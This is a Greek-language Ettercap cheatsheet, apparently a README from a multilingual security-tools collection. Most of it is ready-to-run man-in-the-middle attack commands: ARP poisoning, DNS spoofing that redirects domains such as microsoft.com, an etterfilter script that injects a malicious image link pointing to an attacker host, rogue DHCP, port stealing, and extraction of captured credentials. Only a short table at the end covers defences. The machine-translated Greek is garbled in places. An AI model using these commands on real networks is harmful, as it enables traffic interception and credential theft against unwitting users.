<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Ettercap Cheatsheet

Το [Ettercap](https://www.ettercap-project.org/) είναι μια ολοκληρωμένη σουίτα για επιθέσεις man-in-the-middle (MITM) σε τοπικά δίκτυα (LAN). Διαθέτει sniffing ζωντανών συνδέσεων, φιλτράρισμα περιεχομένου εν κινήσει, ενεργή και παθητική ανατομή πολλών πρωτοκόλλων και υποστήριξη για δηλητηρίαση ARP, ανακατευθύνσεις ICMP, πλαστογράφηση DHCP και κλοπή θυρών.

---

## Πίνακας περιεχομένων

- [Αρχιτεκτονική και λειτουργίες πυρήνα] (#core-architecture--modes)
- [Εγκατάσταση και γρήγορη ρύθμιση] (#installation--quick-setup)
- [ARP Poisoning & Sniffing](#arp-poisoning--sniffing)
- [DNS Spoofing Attacks](#dns-spoofing-attacks)
- [Προσαρμοσμένο φιλτράρισμα πακέτων (`etterfilter`)](#custom-packet-filtering-etterfilter)
- [DHCP Spoofing & Port Stealing](#dhcp-spoofing--port-stealing)
- [Logging & Packet Extraction](#logging--packet-extraction)
- [Defensive Detection & Countermeasures](#defensive-detection--countermeasures)

---

## Core Architecture & Modes

Το Ettercap υποστηρίζει πολλαπλούς τρόπους εκτέλεσης:
- **`-T` (Λειτουργία κειμένου):** Ελαφρύ, χωρίς κατάρες έξοδο τερματικού, ιδανικό για δέσμες ενεργειών και αυτοματισμό χωρίς κεφάλι.
- **`-C` (Λειτουργία κατάρες):** Διεπαφή τερματικού που βασίζεται σε Ncurses για διαδραστικές λειτουργίες χωρίς X11.
- **`-G` (λειτουργία GTK):** Πλήρης γραφική διεπαφή.
- **`-D` (Λειτουργία Daemon):** Εκτελείται αθόρυβα στο παρασκήνιο.

Σύνταξη προδιαγραφών στόχου:
```text
/MAC/IPs/IPv6/PORTs
```
- Οι στόχοι μπορούν να διαχωριστούν με κόμματα ή εύρη IP: Το `//` ταιριάζει με τα πάντα.
- Παράδειγμα: Το `/192.168.1.50/` στοχεύει το IP `192.168.1.50` σε όλες τις θύρες.
- Παράδειγμα: Το `//80,443/` στοχεύει όλους τους κεντρικούς υπολογιστές στις θύρες 80 και 443.

---

## Εγκατάσταση & Γρήγορη εγκατάσταση
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
Επαληθεύστε τις θέσεις των αρχείων διαμόρφωσης:
- `/etc/ettercap/etter.conf`: Βασικό δίκτυο και διαμόρφωση απόρριψης προνομίων.
- `/etc/ettercap/etter.dns`: Πίνακας αναζήτησης εγγραφών πλαστογράφησης DNS.

---

## ARP Poisoning & Sniffing

### 1. Αμφίδρομη απομακρυσμένη δηλητηρίαση ARP
Poison ARP πίνακες μεταξύ ενός σταθμού εργασίας στόχου και της πύλης δικτύου:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: Λειτουργία κειμένου.
- `-q`: Αθόρυβη λειτουργία (μειώνει την πολυγλωσσία, εμφανίζει μόνο τα διαπιστευτήρια που έχουν καταγραφεί).
- `-i eth0`: Διεπαφή δικτύου ακρόασης και έγχυσης.
- `-M arp:remote`: Εκτελέστε αμφίδρομη δηλητηρίαση από άνθρωπο στη μέση ARP.

### 2. Ανίχνευση ολόκληρου υποδικτύου (Μονόδρομος / Μετάδοση)
Δηλητηριάστε όλους τους κεντρικούς υπολογιστές στο υποδίκτυο έναντι της προεπιλεγμένης πύλης:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. Μόνο Παθητικό Σνιφάρισμα
Καταγράψτε διαπιστευτήρια απλού κειμένου που διέρχονται από τον τρέχοντα κεντρικό υπολογιστή χωρίς πλαστογράφηση ARP:
```bash
sudo ettercap -T -q -i eth0
```
---

## Επιθέσεις πλαστογράφησης DNS

Το Ettercap περιλαμβάνει ενσωματωμένα πρόσθετα, συμπεριλαμβανομένου του `dns_spoof`.

### Βήμα 1: Διαμόρφωση του `/etc/ettercap/etter.dns`
Προσθήκη μπαλαντέρ ή ανακατεύθυνσης συγκεκριμένου τομέα:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### Βήμα 2: Εκκινήστε το Ettercap με πρόσθετο DNS
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: Ενεργοποιεί την προσθήκη DNS spoofing.
- Τα ερωτήματα DNS που έχουν υποκλαπεί που ταιριάζουν με το `etter.dns` επιστρέφουν την IP του εισβολέα.

---

## Προσαρμοσμένο φιλτράρισμα πακέτων (`etterfilter`)

Το Ettercap επιτρέπει την επιθεώρηση πακέτων σε πραγματικό χρόνο και την τροποποίηση ωφέλιμου φορτίου χρησιμοποιώντας προσαρμοσμένα σενάρια φίλτρων.

### 1. Γράψτε σενάριο φίλτρου (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. Μεταγλώττιση φίλτρου με `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. Εκτέλεση με φίλτρο
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## DHCP Spoofing & Port Stealing

### 1. Αδίστακτη επίθεση διακομιστή DHCP
Απόκριση γρηγορότερα από τον νόμιμο διακομιστή DHCP για να εκχωρήσετε διευθύνσεις απατεώνων πύλης και DNS:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Σύνταξη: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Port Stealing Attack (Πλημμύρα διακόπτη / Κατάχρηση τραπεζιού CAM)
Κλέψτε κίνηση σε δίκτυα μεταγωγής όπου η δηλητηρίαση ARP είναι αποκλεισμένη ή ειδοποιημένη:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## Καταγραφή & Εξαγωγή πακέτων

### Αποθήκευση Raw Captured Sesions
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: Γράψτε ακατέργαστα δεδομένα πακέτου pcap.
- `-L ettercap_log`: Γράψτε τεμαχισμένα αρχεία καταγραφής κειμένου με δυνατότητα ανάγνωσης από τον άνθρωπο.

### Μετατροπή δυαδικών αρχείων καταγραφής με `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## Αμυντικά Ανίχνευση & Αντίμετρα

| Διάνυσμα | Μηχανισμός Ανίχνευσης & Άμυνας |
|---|---|
| **Πλάθος ARP** | Ενεργοποίηση Dynamic ARP Inspection (DAI) σε διαχειριζόμενους διακόπτες. Επιθεωρήστε το `arp -a` για διπλότυπα MAC. εκτελέστε το `arpwatch` ή το `arpon`. |
| **Πλάθος DNS** | Επιβολή DNSSEC, DoH (DNS-over-HTTPS) ή DoT (DNS-over-TLS). |
| **Πλάθος DHCP** | Ενεργοποιήστε το DHCP Snooping στους διακόπτες για να ορίσετε αξιόπιστες θύρες ανερχόμενης ζεύξης. |
| **Κλοπή λιμανιού** | Εφαρμόστε 802.1X Network Access Control (NAC) και ασφάλεια θύρας με όρια MAC ανά θύρα μεταγωγέα. |